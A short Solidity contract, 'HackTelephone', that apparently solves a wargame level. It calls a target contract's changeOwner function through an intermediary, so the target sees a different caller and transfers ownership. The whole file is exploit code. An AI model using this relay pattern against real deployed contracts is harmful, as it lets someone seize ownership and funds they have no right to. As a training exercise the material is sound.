// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    ITelephone telephone;

    constructor(address _telephoneAddr) {
        telephone = ITelephone(_telephoneAddr);
    }

    function changeOwner(address _owner) external {
        telephone.changeOwner(_owner);
    }
}